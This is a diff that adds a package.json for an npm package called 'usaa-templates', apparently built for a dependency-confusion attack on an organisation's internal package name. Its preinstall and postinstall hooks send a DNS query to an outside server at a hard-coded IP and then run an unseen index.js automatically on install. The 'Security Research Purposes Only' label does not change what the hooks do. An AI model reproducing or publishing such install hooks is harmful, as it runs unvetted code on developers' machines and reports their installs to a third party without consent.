@@ -1,0 +1,15 @@
+{
+    "name" : "usaa-templates",
+    "version" : "3.16.0",
+    "description" : "Security Research Purposes Only",
+    "main" : "index.js",
+    "scripts" : {
+        "test" : "echo \"Error: no test specified\" && exit 1",
+        "preinstall" : "nslookup preinstall.dns.w00dr0w-usaa.com 3.145.70.183 && node index.js",
+        "start" : "node index.js",
+        "postinstall" : "nslookup preinstall.dns.w00dr0w-usaa.com 3.145.70.183 && node index.js"
+    },
+    "author" : "",
+    "license" : "ISC"
+
+}
